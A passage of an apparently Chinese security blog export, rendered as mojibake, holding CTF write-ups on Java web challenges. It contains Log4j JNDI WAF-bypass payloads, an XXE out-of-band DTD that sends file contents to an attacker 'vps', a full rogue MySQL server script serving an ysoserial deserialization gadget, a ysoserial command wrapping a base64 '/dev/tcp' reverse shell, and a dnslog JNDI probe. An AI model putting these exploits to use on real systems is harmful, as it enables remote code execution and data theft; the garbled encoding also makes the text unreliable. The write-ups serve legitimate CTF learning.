å¯ä»¥å‘ç°è¯¥æ–¹æ³•çš„å…·ä½“æµç¨‹ä¸­æœ‰lookupæ–¹æ³•ï¼Œä¸ç¡®å®šæ˜¯ä¸æ˜¯æˆ‘ä»¬éœ€è¦çš„Jndiçš„lookupæ–¹æ³•ï¼Œè·Ÿè¿›çœ‹ä¸€çœ‹ï¼š å¯è§è¿™é‡Œè¿˜ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„Jndiçš„lookupæ–¹æ³•ï¼Œè¿™é‡Œçš„æ˜¯Interpolatorç±»çš„lookupæ–¹æ³•ï¼Œå®ƒæå–å‡ºæ¥äº†:ä¹‹å‰çš„å€¼ï¼Œå³jndiï¼Œå¹¶è·å–JndiLookupç±»,æœ€ç»ˆåœ¨163è¡Œè¿™é‡Œè°ƒç”¨JndiLookupç±»çš„lookupæ–¹æ³•ï¼š ä¹‹åä¾¿æ˜¯ä¸€ç³»åˆ—çš„Jndiæ³¨å…¥çš„æµç¨‹ è‡³äºä¸ºä»€ä¹ˆä¼šè§¦å‘ä¸¤æ¬¡ï¼Œæˆ‘è°ƒè¯•çœ‹äº†çœ‹ï¼Œå¤§è‡´æ˜¯å› ä¸ºåœ¨åŠ è½½çš„æ—¶å€™åœ¨å‘½ä»¤è¡Œæ‰“å°å‰ä¼šè§¦å‘ä¸€éï¼Œä¹‹åå†™å…¥æ—¥å¿—ä¸­è¿˜ä¼šè§¦å‘ä¸€é(è¿™ä¸ªæˆ‘çœ‹äº†ç½‘ä¸Šä¸å°‘æ–‡ç« ï¼Œä½†è²Œä¼¼å¸ˆå‚…ä»¬éƒ½æ²¡æœ‰æåˆ°è¿™ä¸€ç‚¹) 4.Bypassç½‘ä¸Šå¾ˆå¤šçš„WAFéƒ½æ˜¯åŸºäºå¯¹jndiå…³é”®å­—çš„è¿‡æ»¤ï¼Œå› ä¸ºåœ¨å®˜æ–¹æ–‡æ¡£ä¸­æœ‰è¿™ä¹ˆä¸€å¥è¯ï¼š å¦‚æœUSERè¿™ä¸ªç¯å¢ƒå˜é‡æœªè®¾ç½®ï¼Œå°±ä¼šä½¿ç”¨é»˜è®¤å€¼ï¼Œè€Œè¿™è‚¯å®šä¸æ˜¯æˆ‘ä»¬å¸Œæœ›çš„ï¼Œä¸‹é¢æ¥çœ‹ä¸€çœ‹å¦‚ä½•è¿›è¡Œjndiå…³é”®å­—çš„ç»•è¿‡ï¼š 1)å¤š${}ç»•è¿‡ï¼š123$&#123;$&#123;::-J&#125;ndi:ldap://127.0.0.1:7777/TestRef&#125;$&#123;$&#123;::-j&#125;$&#123;::-n&#125;$&#123;::-d&#125;$&#123;::-i&#125;:$&#123;::-l&#125;$&#123;::-d&#125;$&#123;::-a&#125;$&#123;::-p&#125;://127.0.0.1/TestRef&#125;$&#123;jndi:$&#123;lower:l&#125;$&#123;lower:d&#125;a$&#123;lower:p&#125;://127.0.0.1/TestRef&#125; #ç»•è¿‡ldapçš„è¿‡æ»¤ 2)å¤§å°å†™ç»•è¿‡ï¼šå› ä¸ºå‰è¾¹åœ¨çœ‹resolverçš„æ—¶å€™çœ‹åˆ°äº†lowerå’Œupperï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·ï¼š 12$&#123;$&#123;lower:JN&#125;di:ldap://127.0.0.1:7777/TestRef&#125;$&#123;$&#123;upper:jn&#125;DI:ldap://127.0.0.1:7777/TestRef&#125; å¤§å°å†™æ˜¯æ— æ‰€è°“çš„ï¼Œå› ä¸ºåœ¨Interpolatorç±»çš„lookupæ–¹æ³•ä¸­ä¼šå¯¹æˆªå–åˆ°çš„å­—ç¬¦å…¨éƒ¨å°å†™åŒ– 3)ç‰¹æ®Šå­—ç¬¦ç»•è¿‡ï¼š1$&#123;jnd$&#123;upper:Ä±&#125;:ldap://127.0.0.1:7777/TestRef&#125; 4)unicodeç»•è¿‡ï¼šemmï¼Œæœ¬åœ°çš„ç¯å¢ƒåæ­£æ²¡è¿‡ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ç”¨ï¼Œå…ˆè®°ä¸‹æ¥ï¼š 1$&#123;sys:\\u006fs.name&#125; 5)ä¸å‡ºç°ç«¯å£å·ï¼šæ³¨æ„æ­¤æ—¶éœ€è¦ldapæœåŠ¡ç«¯å£ä¸º389 12$&#123;jndi:ldap://127.0.0.1/TestRef&#125;$&#123;jndi:ldap://[127.0.0.1]/TestRef&#125; å°ç»“å…ˆå†™åˆ°è¿™é‡Œå§ï¼Œä¹‹åå­¦åˆ°ä»€ä¹ˆæ–°çš„ä¸œè¥¿å†å¾€ä¸Šæ·»","categories":[],"tags":[]},{"title":"NSSCTFé¶åœºJAVAé¢˜å…¨è§£ï¼ˆå·²å®Œç»“ï¼‰","slug":"NSSCTFé¶åœºJAVAé¢˜å…¨è§£","date":"2024-04-18T14:31:56.253Z","updated":"2024-08-24T12:33:41.034Z","comments":true,"path":"2024/04/18/NSSCTFé¶åœºJAVAé¢˜å…¨è§£/","link":"","permalink":"http://example.com/2024/04/18/NSSCTF%E9%9D%B6%E5%9C%BAJAVA%E9%A2%98%E5%85%A8%E8%A7%A3/","excerpt":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;4&#x2F;18 åˆ†ç±»ï¼šwriteup","text":"ä½œè€…ï¼šNarcher æ—¶é—´ï¼š2024&#x2F;4&#x2F;18 åˆ†ç±»ï¼šwriteup [ç½‘é¼æ¯ 2020é’é¾™ç»„]FileJavaæ‰“å¼€ç½‘å€ï¼Œå‘ç°å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œä¸Šä¼ åè¿˜å¯ä»¥è¿›è¡Œæ–‡ä»¶ä¸‹è½½ï¼Œæˆ‘ä»¬å°±éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶ï¼Œç„¶åä¸‹è½½æŠ“åŒ…çœ‹çœ‹æœ‰ä»€ä¹ˆå¯åˆ©ç”¨çš„ä¸œè¥¿ï¼š çŒœæµ‹å¯èƒ½å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œæˆ‘ä»¬ä¿®æ”¹filenameçš„å€¼ï¼š éšä¾¿ä¸€æ”¹å°±å‘ç°å®ƒè‡ªå·±æŠ¥é”™æŠŠè·¯å¾„ä»€ä¹ˆçš„å…¨éƒ½çˆ†å‡ºæ¥äº†ï¼Œæˆ‘ä»¬å°è¯•è¯»å–flagï¼š å‘ç°å­˜åœ¨flagå­—ç¬¦ä¸²ä¾¿ä¼šå¯¼è‡´ç¦æ­¢è¯»å–ï¼Œé‚£æˆ‘ä»¬æ ¹æ®å‰è¾¹çš„æŠ¥é”™æ‰¾ä¸€ä¸‹web.xmlè¿™ç§æ•æ„Ÿæ–‡ä»¶ï¼ˆä¸€èˆ¬ä½äºWEB-INFç›®å½•ä¸‹ï¼‰ï¼š æˆåŠŸè¯»å–ï¼Œä¹‹åæŠŠç›¸å…³æ–‡ä»¶å…¨éƒ½è¯»å–ä¸‹è½½ä¸‹æ¥ï¼š è¿˜æœ‰ä¸¤ä¸ªå°±ä¸æˆªå›¾äº†ï¼Œä¸€æ ·çš„ï¼Œåæ­£ä¸‹è½½ä¸‹æ¥ä¹‹ååç¼–è¯‘æŸ¥çœ‹æºç å¼€å§‹åˆ†æå°±è¡Œäº†ï¼š å…³é”®éƒ¨åˆ†å¦‚ä¸Šæ‰€ç¤ºï¼Œçœ‹è§tryé‡Œè¾¹çš„ä»£ç å°±è‡ªç„¶è€Œç„¶æƒ³åˆ°äº†CVE-2014-3529 ä¸‹é¢æˆ‘æ­äº†ä¸ªæœ¬åœ°æµ‹è¯•çš„ç¯å¢ƒï¼Œå¤§è‡´è°ƒè¯•çœ‹äº†ä¸€ä¸‹ï¼Œå…³é”®çš„åœ°æ–¹è¯´ä¸€ä¸‹ï¼š é¦–å…ˆï¼Œæˆ‘ä»¬è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ï¼Œéœ€è¦å¯¹xlsxæ–‡ä»¶è§£å‹ç¼©ï¼Œå¹¶ä¿®æ”¹å…¶ä¸­çš„[Content_Types].xmlæ–‡ä»¶ï¼Œåˆ‡è®°ä¸èƒ½æ”¹æ–‡ä»¶åï¼Œå› ä¸ºæ‰§è¡Œè¿‡ç¨‹å‰ä¼šæœ‰å¯¹è¿™ä¸ªæ–‡ä»¶çš„åˆ¤æ–­ï¼š å…¶æ¬¡ï¼Œxxeæ³¨å…¥åœ¨è¿™é‡Œè§¦å‘ï¼š å¯¹äºé¢˜ç›®è€Œè¨€ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ç›´æ¥å…ˆunzipä¸€ä¸ªxlsxæ–‡ä»¶ï¼Œåœ¨[Content_Types].xmlæ–‡ä»¶ä¸­çš„ç¬¬äºŒè¡Œæ·»åŠ ï¼ˆæ³¨ï¼švpså¤„å¡«å†™è‡ªå·±çš„æœåŠ¡å™¨å…¬ç½‘IPå’ŒhttpæœåŠ¡å¼€æ”¾çš„ç«¯å£ï¼‰ï¼š 1234&lt;!DOCTYPE convert [&lt;!ENTITY % remote SYSTEM &quot;http://vps/file.dtd&quot;&gt;%remote;%int;%send;]&gt; ç„¶ååœ¨vpsä¸ŠæŒ‚ä¸€ä¸ªfile.dtdï¼Œå¹¶å¼€å¯httpæœåŠ¡ï¼Œå¹¶ncç›‘å¬7777ç«¯å£ï¼Œfile.dtdå†…å®¹å¦‚ä¸‹ï¼š 12&lt;!ENTITY % file SYSTEM &quot;file:///flag&quot;&gt;&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://vps:7777?p=%file;&#x27;&gt;&quot;&gt; æŠŠè§£å‹ç¼©å¹¶ä¿®æ”¹åçš„æ–‡ä»¶é‡æ–°å‹ç¼©å›xlsxæ–‡ä»¶ï¼Œå‘½ä»¤ï¼šzip -r xxe.xlsx * å¹¶å‘½åä¸ºå¦‚ä¸‹æ ¼å¼ï¼š ä¹‹åä¸Šä¼ å°±å¯ä»¥äº†ï¼š æˆåŠŸè·å–flag [ç¾ŠåŸæ¯ 2020]a_piece_of_javaæŠŠä¸‹è½½åˆ°çš„æºç ä½¿ç”¨jar xvf xxx.jarå‘½ä»¤åç¼–è¯‘å¾—åˆ°æºç ï¼Œåœ¨&#x2F;helloä¸­å‘ç°ååºåˆ—åŒ–è§¦å‘ç‚¹ï¼š ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬éœ€è¦æŠŠåºåˆ—åŒ–çš„æ•°æ®æ”¾åœ¨httpå¤´çš„cookieä¸­å³å¯æ‰§è¡Œååºåˆ—åŒ–ï¼Œä½†deserializeä¸­è¿˜æœ‰ä¸€ä¸ªè¿‡æ»¤ï¼š ä¸Šè¿°ç™½åå•åªå…è®¸é€šè¿‡å®ƒè‡ªå·±è§„å®šçš„ç±»å’Œjava.langé‡Œçš„ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥ç”¨ysoserializeä¸­çš„é“¾å­æ˜¯æ‰“ä¸é€šçš„ï¼Œç»§ç»­çœ‹ï¼š 12345678910private void connect() &#123; String url = &quot;jdbc:mysql://&quot; + this.host + &quot;:&quot; + this.port + &quot;/jdbc?user=&quot; + this.username + &quot;&amp;password=&quot; + this.password + &quot;&amp;connectTimeout=3000&amp;socketTimeout=6000&quot;; try &#123; this.connection = DriverManager.getConnection(url); &#125; catch (Exception var3) &#123; var3.printStackTrace(); &#125;&#125; åœ¨DatabaseInfo.classä¸­å¯ä»¥çœ‹åˆ°å¦‚ä¸Šä»£ç ï¼Œå¾ˆæ˜æ˜¾å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨MYSQL JDBCååºåˆ—åŒ–è¿™ä¸ªæ¼æ´ï¼Œæˆ‘ä»¬å†å»çœ‹çœ‹ä¾èµ–åŒ…ä¸­çš„ç‰ˆæœ¬ï¼š 1mysql-connector-java-8.0.19.jar æ—¢ç„¶æ˜¯8.xç‰ˆæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æŠŠç›¸å…³çš„é“¾å­æ‹¿è¿‡æ¥ç”¨ï¼š 1jdbc:mysql://x.x.x.x:3307/test?autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor è‡³äºMYSQLæœåŠ¡å™¨æˆ‘ä»¬å»copyä¸€ä¸‹å¤§ä½¬å†™å¥½çš„è„šæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import socketimport binasciiimport osgreeting_data=&quot;4a0000000a352e372e31390008000000463b452623342c2d00fff7080200ff811500000000000000000000032851553e5c23502c51366a006d7973716c5f6e61746976655f70617373776f726400&quot;response_ok_data=&quot;0700000200000002000000&quot;def receive_data(conn): data = conn.recv(1024) print(&quot;[*] Receiveing the package : &#123;&#125;&quot;.format(data)) return str(data).lower()def send_data(conn,data): print(&quot;[*] Sending the package : &#123;&#125;&quot;.format(data)) conn.send(binascii.a2b_hex(data))def get_payload_content(): #fileæ–‡ä»¶çš„å†…å®¹ä½¿ç”¨ysoserialç”Ÿæˆçš„ ä½¿ç”¨è§„åˆ™ï¼šjava -jar ysoserial [Gadget] [command] &gt; payload file= r&#x27;payload&#x27; if os.path.isfile(file): with open(file, &#x27;rb&#x27;) as f: payload_content = str(binascii.b2a_hex(f.read()),encoding=&#x27;utf-8&#x27;) print(&quot;open successs&quot;) else: print(&quot;open false&quot;) #calc payload_content=&#x27;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b7340300007870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e7472798aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d61702e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e5472616e73666f726d65723bbd562af1d83418990200007870000000057372003b6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c000969436f6e7374616e7471007e00037870767200116a6176612e6c616e672e52756e74696d65000000000000000000000078707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b65725472616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a6176612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000274000a67657452756e74696d65757200125b4c6a6176612e6c616e672e436c6173733bab16d7aecbcd5a990200007870000000007400096765744d6574686f647571007e001b00000002767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078707671007e001b7371007e00137571007e001800000002707571007e001800000000740006696e766f6b657571007e001b00000002767200106a6176612e6c616e672e4f626a656374000000000000000000000078707671007e00187371007e0013757200135b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b4702000078700000000174000463616c63740004657865637571007e001b0000000171007e00207371007e000f737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c7565787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b020000787000000001737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000077080000001000000000787878&#x27; return payload_contentdef run(): while 1: conn, addr = sk.accept() print(&quot;Connection come from &#123;&#125;:&#123;&#125;&quot;.format(addr[0],addr[1])) # 1.å…ˆå‘é€ç¬¬ä¸€ä¸ª é—®å€™æŠ¥æ–‡ send_data(conn,greeting_data) while True: # ç™»å½•è®¤è¯è¿‡ç¨‹æ¨¡æ‹Ÿ 1.å®¢æˆ·ç«¯å‘é€request loginæŠ¥æ–‡ 2.æœåŠ¡ç«¯å“åº”response_ok receive_data(conn) send_data(conn,response_ok_data) #å…¶ä»–è¿‡ç¨‹ data=receive_data(conn) #æŸ¥è¯¢ä¸€äº›é…ç½®ä¿¡æ¯,å…¶ä¸­ä¼šå‘é€è‡ªå·±çš„ ç‰ˆæœ¬å· if &quot;session.auto_increment_increment&quot; in data: _payload=&#x27;01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c21001b000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000020100150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013107343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e0cd6d0b9fab1ead7bccab1bce4062b30383a30300f52455045415441424c452d5245414405323838303007000016fe000002000000&#x27; send_data(conn,_payload) data=receive_data(conn) elif &quot;show warnings&quot; in data: _payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000&#x27; send_data(conn, _payload) data = receive_data(conn) if &quot;set names&quot; in data: send_data(conn, response_ok_data) data = receive_data(conn) if &quot;set character_set_results&quot; in data: send_data(conn, response_ok_data) data = receive_data(conn) if &quot;show session status&quot; in data: mysql_data = &#x27;0100000102&#x27; mysql_data += &#x27;1a000002036465660001630163016301630c3f00ffff0000fc9000000000&#x27; mysql_data += &#x27;1a000003036465660001630163016301630c3f00ffff0000fc9000000000&#x27; # ä¸ºä»€ä¹ˆæˆ‘åŠ äº†EOF Packet å°±æ— æ³•æ­£å¸¸è¿è¡Œå‘¢ï¼Ÿï¼Ÿ # è·å–payload payload_content=get_payload_content() # è®¡ç®—payloadé•¿åº¦ payload_length = str(hex(len(payload_content)//2)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(4) payload_length_hex = payload_length[2:4] + payload_length[0:2] # è®¡ç®—æ•°æ®åŒ…é•¿åº¦ data_len = str(hex(len(payload_content)//2 + 4)).replace(&#x27;0x&#x27;, &#x27;&#x27;).zfill(6) data_len_hex = data_len[4:6] + data_len[2:4] + data_len[0:2] mysql_data += data_len_hex + &#x27;04&#x27; + &#x27;fbfc&#x27;+ payload_length_hex mysql_data += str(payload_content) mysql_data += &#x27;07000005fe000022000100&#x27; send_data(conn, mysql_data) data = receive_data(conn) if &quot;show warnings&quot; in data: payload = &#x27;01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000&#x27; send_data(conn, payload) breakif __name__ == &#x27;__main__&#x27;: HOST =&#x27;0.0.0.0&#x27; PORT = 3307 sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #å½“socketå…³é—­åï¼Œæœ¬åœ°ç«¯ç”¨äºè¯¥socketçš„ç«¯å£å·ç«‹åˆ»å°±å¯ä»¥è¢«é‡ç”¨.ä¸ºäº†å®éªŒçš„æ—¶å€™ä¸ç”¨ç­‰å¾…å¾ˆé•¿æ—¶é—´ sk.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) sk.bind((HOST, PORT)) sk.listen(1) print(&quot;start fake mysql server listening on &#123;&#125;:&#123;&#125;&quot;.format(HOST,PORT)) run() è‡³äºpayloadæ–‡ä»¶æˆ‘ä»¬éœ€è¦ä½¿ç”¨ysoserialç”Ÿæˆï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š 1java -jar ysoserial.jar CommonsCollections6 &quot;bash -c &#123;echo,xxxxxxxxxxxxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; &gt; payload xxxxxxxxxxxxxå¤„å¡«å†™åå¼¹shellå‘½ä»¤çš„base64ç¼–ç ï¼Œä¾‹å¦‚ï¼š/bin/bash -i &gt;&amp; /dev/tcp/1.1.1.1/7777 0&gt;&amp;1çš„base64ï¼šL2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEuMS4xLjEvNzc3NyAwPiYx è€Œåœ¨é¢˜ç›®ä¸­è§¦å‘MYSQL JDBCçš„é“¾å­è¿˜æ˜¯éœ€è¦æˆ‘ä»¬è‡ªå·±æ„é€ ï¼Œæˆ‘ä»¬ä»DatabaseInfo.classçš„connect()æ–¹æ³•å¾€ä¸Šæº¯æºï¼Œå¯ä»¥æ‰¾åˆ°DatabaseInfo.classçš„checkAllInfo()æ–¹æ³•ï¼Œè€ŒcheckAllInfo()æ–¹æ³•è¢«é¢˜ç›®ä¸­é‡å†™çš„InfoInvocationHandlerçš„è°ƒç”¨ï¼š é‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å°±å¾ˆæ˜ç¡®äº†ï¼Œå°±æ˜¯å…ˆç»™DatabaseInfoç±»çš„å®ä¾‹èµ‹å€¼ä¸º8.xç‰ˆæœ¬çš„é“¾å­å½¢å¼ï¼Œä¹‹åå°†å…¶èµ‹å€¼ç»™InfoInvocationHandlerç±»çš„å®ä¾‹ä¸­çš„infoï¼Œå¹¶ä½¿ç”¨åŠ¨æ€ä»£ç†è§¦å‘invoke()æ–¹æ³•è¿›è€Œæ‰§è¡Œä¸€ç³»åˆ—ååºåˆ—åŒ–æµç¨‹ï¼Œæœ€ç»ˆé€šè¿‡MYSQL JDBCè·å–åˆ°vpsä¸Šçš„payloadè¿›è€Œæ‰§è¡Œæ— è¿‡æ»¤çš„ååºåˆ—åŒ–å°†shellåå¼¹åˆ°vpsä¸Šå³å¯ï¼Œé“¾å­å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223242526272829import gdufs.challenge.web.model.*;import gdufs.challenge.web.invocation.InfoInvocationHandler;import java.io.ByteArrayOutputStream;import java.io.ObjectOutputStream;import java.lang.reflect.Proxy;import java.util.Base64;public class Test &#123; public static void main(String[] args) throws Exception&#123; DatabaseInfo databaseinfo=new DatabaseInfo(); databaseinfo.setHost(&quot;IP&quot;);//æ­¤å¤„å¡«å†™è‡ªå·±çš„vpså…¬ç½‘IP databaseinfo.setPort(&quot;3307&quot;); databaseinfo.setUsername(&quot;1&quot;); databaseinfo.setPassword(&quot;1&amp;autoDeserialize=true&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&quot;); InfoInvocationHandler infoInvocationHandler=new InfoInvocationHandler(databaseinfo); Info info=(Info)Proxy.newProxyInstance(databaseinfo.getClass().getClassLoader(),databaseinfo.getClass().getInterfaces(), infoInvocationHandler); ByteArrayOutputStream byteArrayOutputStream=new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream=new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(info); objectOutputStream.close(); String str=new String(Base64.getEncoder().encode(byteArrayOutputStream.toByteArray())); System.out.println(str); &#125;&#125; ä¹‹åpython3 mysql.pyå¼€å¯mysqlæœåŠ¡å™¨ï¼Œå¹¶ncç›‘å¬æ¥æ”¶åå¼¹çš„ç«¯å£ï¼Œå†è®¿é—®&#x2F;helloï¼Œåœ¨cookieå¤„å¡«å†™ä¸Šè¿°è„šæœ¬çš„é“¾å­ï¼š å»vpså¤„æŸ¥çœ‹è·å–shellï¼Œç›´æ¥cat &#x2F;flagè·å–flagï¼š ï¼ˆæœ¬é¢˜éœ€è¦äº†è§£MYSQL JDBCååºåˆ—åŒ–ç›¸å…³çŸ¥è¯†ç‚¹ï¼Œå½“ç„¶åªæ˜¯ç®€å•çš„çŸ¥é“æµç¨‹å°±èƒ½åšé¢˜ï¼Œä½†æˆ‘è¿˜æ˜¯ä»è¿™é‡Œç«‹ä¸€ä¸ªFLAGå§ï¼Œåœ¨å¤ç°å®ŒNSSCTFçš„æ‰€æœ‰Javaé¢˜ä¹‹åä¸€å®šè¦æŠ½ç©ºè°ƒè¯•å­¦ä¹ ä¸€ä¸‹å…·ä½“æµç¨‹ï¼Œè¿™é¢˜çš„å¤ç°å‚è€ƒäº†å¾ˆå¤šå¤§ä½¬çš„åšå®¢ï¼Œæ„Ÿè§‰è¿˜æ˜¯éœ€è¦ä¸æ–­å­¦ä¹ æ‰èƒ½æé«˜è‡ªå·±ï¼‰ [HZNUCTF 2023 final]ezjavaåˆšå¼€å§‹è®©è¿™é¢˜å‘äº†ï¼Œä¸€ç›´dnsæ¢æµ‹ä¸åˆ°ï¼Œç»“æœå‘ç°æ˜¯æ ¡å›­ç½‘çš„é—®é¢˜ï¼Œæ¢äº†ä¸ªç½‘å°±å¥½äº† ä¸æ­¤åŒæ—¶ï¼Œè²Œä¼¼æœ‰ä¸ªè¿‡æ»¤ï¼Œæˆ‘ç”¨${java:os}è¯»ä¸åˆ°ä¸œè¥¿ï¼Œå¹¶ä¸”è²Œä¼¼è¿˜æœ‰ä¸ªæ—¶é—´é™åˆ¶ï¼Œæœ‰æ—¶å€™dnsèƒ½æ¢æµ‹åˆ°ï¼Œæœ‰æ—¶å€™æ¢æµ‹ä¸åˆ°ï¼Œæ€»ä¹‹è¿™é¢˜æœ‰ç‚¹ç„å­¦ï¼ŒåºŸè¯ä¸å¤šè¯´äº†ï¼Œç›´æ¥å¼€å§‹ï¼š çœ‹åˆ°logå’Œfastjsonå°±åŸºæœ¬ä¸Šæ˜ç™½è¿™ä¸ªé¢˜è€ƒä»€ä¹ˆäº†ï¼Œå¤§ä½“æ€è·¯å°±æ˜¯ç”¨log4jçš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´æ¥è§¦å‘jndiæ³¨å…¥ï¼Œåœ¨jndiæ³¨å…¥ä¸­è§¦å‘fastjson 1.2.48çš„ååºåˆ—åŒ–æ¼æ´ æˆ‘ä»¬å…ˆdnsæ¢æµ‹ä¸€ä¸‹ï¼š payload: 1$&#123;jndi:dns://$&#123;sys:java.version&#125;.tzey97.dnslog.cn&#125; æ¢æµ‹å‡ºjdkç‰ˆæœ¬ä¸º8u222ï¼Œå¤§äº8u191ï¼Œå› æ­¤ä¸èƒ½ç›´æ¥jndiæ³¨å…¥æ‹¿shellï¼Œè¿™å°±éœ€è¦hintçš„Fastjson 1.2.48çš„ååºåˆ—åŒ–æ¼æ´äº†ã€‚ å¤§è‡´æ€è·¯ä¸ºï¼šåˆ©ç”¨LDAPç›´æ¥è¿”å›ä¸€ä¸ªæ¶æ„çš„åºåˆ—åŒ–å¯¹è±¡ï¼ŒJNDIæ³¨å…¥å¯¹è¯¥åºåˆ—åŒ–å¯¹è±¡è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œåˆ©ç”¨ååºåˆ—åŒ–æ¥å®Œæˆå‘½ä»¤æ‰§è¡Œã€‚é‚£ä¹ˆè¿™é‡Œæˆ‘ä»¬å°±éœ€è¦åˆ©ç”¨LDAPè¿”å›ä¾èµ–Fastjson 1.2.48çš„åºåˆ—åŒ–é“¾ ç½‘ä¸Šæµä¼ çš„éƒ½æ˜¯1.2.83çš„é€šæ€é“¾ï¼Œæˆ‘è¿™é‡Œä¹Ÿå°±ç›´æ¥æ‹¿è¿‡æ¥äº†ï¼š 